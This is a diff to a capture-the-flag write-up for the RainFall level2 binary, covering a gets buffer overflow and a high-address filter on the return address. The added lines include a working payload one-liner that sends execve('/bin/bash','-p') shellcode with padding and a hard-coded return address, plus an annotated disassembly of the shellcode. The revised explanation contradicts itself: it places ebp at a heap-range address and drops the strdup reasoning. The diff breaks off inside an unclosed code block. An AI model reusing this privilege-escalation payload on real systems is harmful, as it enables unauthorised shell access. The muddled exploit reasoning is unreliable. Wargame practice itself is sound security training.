@@ -52,7 +52,7 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-While the function still calls `gets`, the `system` call is no longer present in the binary:
+While the function still calls `gets`, the `system` call is no longer present in the PLT:
 
 ```
 level2@RainFall:~$ objdump -d level2 | grep '@plt'
@@ -66,23 +66,26 @@ level2@RainFall:~$ objdump -d level2 | grep '@plt'
  8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 ```
 
-##  PLT vs. GOT
+It is still possible to find the address of the `system` function in the libc:
 
-Before we continue, we need to explain what the Procedure Linkage Table (PLT) and Global Offset Table (GOT) are.
+```bash
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
 
-When a binary is compiled and linked, function calls to shared libraries (like `libc`) are not resolved at compile time. Instead, they are resolved at runtime. The PLT is a section in the binary that contains stubs for these function calls. When a function is called for the first time, the PLT entry for that function will jump to the dynamic linker, which will then resolve the actual address of the function in memory and update the GOT with this address. Subsequent calls to the same function will then use the address stored in the GOT.
+But the check for the high bits of the return address prevents us from returning to the stack or the libc, since the high ranges `0xb7xxxxxx` are filtered out:
 
-In simpler terms, the PLT is like a table of contents that keeps every function call saved under an alias, while the GOT acts as a cache, or a relay station that points to the actual location of these functions in memory.
+```bash
+(gdb) run < <(python -c 'print("A"*80 + "\x60\xb0\xe6\xb7")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
 
-If we can overwrite an entry in the GOT, we can redirect function calls to any address we want: if you know about MITM attacks, this is a very similar approach in the sense that we are trying to 'poison' the GOT cache to redirect function calls, just like a MITM attack poisons the ARP table to redirect network traffic to a different destination.
+Starting program: /home/user/level2/level2 < <(python -c 'print("A"*80 + "\x60\xb0\xe6\xb7")')
+(0xb7e6b060)
+[Inferior 1 (process 4843) exited with code 01]
+```
 
-##  Exploiting the binary
-
-Here the level gives us subtle hints as to how to proceed. The presence of the `gets` function indicates that we can overflow a buffer, but the absence of `system` suggests we need to call the shell ourselves. The check for the high bits of the input address (the `and` and `cmp` instructions) indicates that we cannot return to the stack or the libc, since the high ranges `0xb7xxxxxx` and `0xbfxxxxxx` are filtered out. The presence of `strdup` is hints at a possible use the heap to store our shellcode, aka the CPU instructions that will spawn our shell.
-
-Since the address range for the heap, the lower addresses, is not filtered out, we can inject our shellcode into the heap and then overwrite a GOT entry to point to this shellcode. When the function corresponding to the overwritten GOT entry is called, it will execute our shellcode instead.
-
-Consider the following instructions:
+The real strategy here is to inject some shellcode into the buffer, since the address range is not filtered out, and then return to it:
 
 ```bash
 python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; print(shellcode + "A"*(80-len(shellcode)) + struct.pack("<I", 0x804a008))' > /tmp/payload
@@ -94,18 +97,26 @@ python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\
 99              cdq               ; edx = 0
 52              push edx          ; NULL terminator
 66 68 2d 70     push word 0x702d  ; "-p"
-89 e1           mov ecx, esp      ; ecx pointe vers "-p"
+89 e1           mov ecx, esp      ; ecx points to "-p"
 52              push edx          ; NULL
 6a 68           push byte 0x68    ; "h"
 68 2f 62 61 73  push 0x7361622f   ; "/bas"
 68 2f 62 69 6e  push 0x6e69622f   ; "/bin"
-89 e3           mov ebx, esp      ; ebx pointe vers "/bin/bash"
+89 e3           mov ebx, esp      ; ebx points to "/bin/bash"
 52              push edx          ; argv[2] = NULL
 51              push ecx          ; argv[1] = "-p"
 53              push ebx          ; argv[0] = "/bin/bash"
 89 e1           mov ecx, esp      ; ecx = argv
 cd 80           int 0x80          ; SYSCALL : execve(ebx, ecx, edx)
 ```
+
+[Source of the shellcode](https://shell-storm.org/shellcode/files/shellcode-606.html)
+
+This is a relatively short shellcode that executes `execve("/bin/bash", "-p", NULL)`, which gives us a shell with the `-p` flag, meaning that it will preserve the effective user ID and group ID, allowing us to keep the privileges of the `level2` user.
+
+Additionally, we have to inject some padding to reach 80 bytes and then overwrite the return address with the address of the buffer, which is `0x804a008` in this case, since the buffer is located at `-0x4c(%ebp)` and `ebp` is located at `0x804a054`:
+
+```bash
 
 We then need to inject this shellcode like so:
 
